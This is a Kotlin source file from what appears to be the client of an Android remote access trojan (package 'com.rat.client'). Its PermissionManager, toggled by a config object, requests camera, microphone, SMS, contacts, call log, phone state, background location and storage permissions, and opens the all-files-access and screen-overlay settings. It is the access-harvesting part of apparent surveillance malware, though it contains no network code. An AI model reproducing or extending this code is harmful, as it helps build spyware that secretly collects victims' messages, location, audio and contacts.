package com.rat.client.utils

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.os.Environment
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * Handles all runtime permission requests and management.
 * On Android 10+ uses scoped approaches, handles "Allow all time" for location.
 */
object PermissionManager {
    private const val TAG = "PermissionManager"

    // All required permissions mapped by category
    val CAMERA_PERMISSIONS = arrayOf(Manifest.permission.CAMERA)

    val STORAGE_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
        )
    } else {
        arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
        )
    }

    val LOCATION_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
    )

    val MICROPHONE_PERMISSIONS = arrayOf(Manifest.permission.RECORD_AUDIO)

    val SMS_PERMISSIONS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
    )

    val CONTACTS_PERMISSIONS = arrayOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.GET_ACCOUNTS,
    )

    val PHONE_PERMISSIONS = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
    )

    val CALL_LOG_PERMISSIONS = arrayOf(
        Manifest.permission.READ_CALL_LOG,
    )

    val ALL_PERMISSIONS = CAMERA_PERMISSIONS +
            STORAGE_PERMISSIONS +
            LOCATION_PERMISSIONS +
            MICROPHONE_PERMISSIONS +
            SMS_PERMISSIONS +
            CONTACTS_PERMISSIONS +
            PHONE_PERMISSIONS

    /**
     * Check if a set of permissions are all granted.
     */
    fun hasPermissions(context: Context, permissions: Array<String>): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if all configured permissions are granted.
     */
    fun hasAllPermissions(context: Context): Boolean {
        val needed = mutableListOf<String>()

        if (com.rat.client.Config.PERM_CAMERA) needed.addAll(CAMERA_PERMISSIONS)
        if (com.rat.client.Config.PERM_STORAGE) needed.addAll(STORAGE_PERMISSIONS)
        if (com.rat.client.Config.PERM_LOCATION) needed.addAll(LOCATION_PERMISSIONS)
        if (com.rat.client.Config.PERM_MICROPHONE) needed.addAll(MICROPHONE_PERMISSIONS)
        if (com.rat.client.Config.PERM_SMS) needed.addAll(SMS_PERMISSIONS)
        if (com.rat.client.Config.PERM_CONTACTS) needed.addAll(CONTACTS_PERMISSIONS)
        if (com.rat.client.Config.PERM_PHONE) needed.addAll(PHONE_PERMISSIONS)
        if (com.rat.client.Config.PERM_CALL_LOGS) needed.addAll(CALL_LOG_PERMISSIONS)

        return hasPermissions(context, needed.toTypedArray())
    }

    /**
     * Request all configured permissions.
     */
    fun requestAllPermissions(activity: Activity, requestCode: Int = 9999) {
        val needed = mutableListOf<String>()

        if (com.rat.client.Config.PERM_CAMERA) needed.addAll(CAMERA_PERMISSIONS)
        if (com.rat.client.Config.PERM_STORAGE) needed.addAll(STORAGE_PERMISSIONS)
        if (com.rat.client.Config.PERM_LOCATION) needed.addAll(LOCATION_PERMISSIONS)
        if (com.rat.client.Config.PERM_MICROPHONE) needed.addAll(MICROPHONE_PERMISSIONS)
        if (com.rat.client.Config.PERM_SMS) needed.addAll(SMS_PERMISSIONS)
        if (com.rat.client.Config.PERM_CONTACTS) needed.addAll(CONTACTS_PERMISSIONS)
        if (com.rat.client.Config.PERM_PHONE) needed.addAll(PHONE_PERMISSIONS)
        if (com.rat.client.Config.PERM_CALL_LOGS) needed.addAll(CALL_LOG_PERMISSIONS)

        val ungranted = needed.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (ungranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(activity, ungranted, requestCode)
        }
    }

    /**
     * Request manage external storage (Android 11+).
     */
    fun requestManageStorage(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:${context.packageName}")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (e: Exception) {
                    // Fallback
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                }
            }
        }
    }

    /**
     * Check if overlay permission is granted.
     */
    fun canDrawOverlays(context: Context): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context)
        }
        return true
    }

    /**
     * Request overlay permission.
     */
    fun requestOverlayPermission(context: Context) {
        if (!canDrawOverlays(context)) {
            try {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:${context.packageName}")
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Overlay permission request failed: ${e.message}")
            }
        }
    }

    /**
     * Request notification permission (Android 13+).
     */
    fun requestNotificationPermission(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(activity, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    10001
                )
            }
        }
    }
}


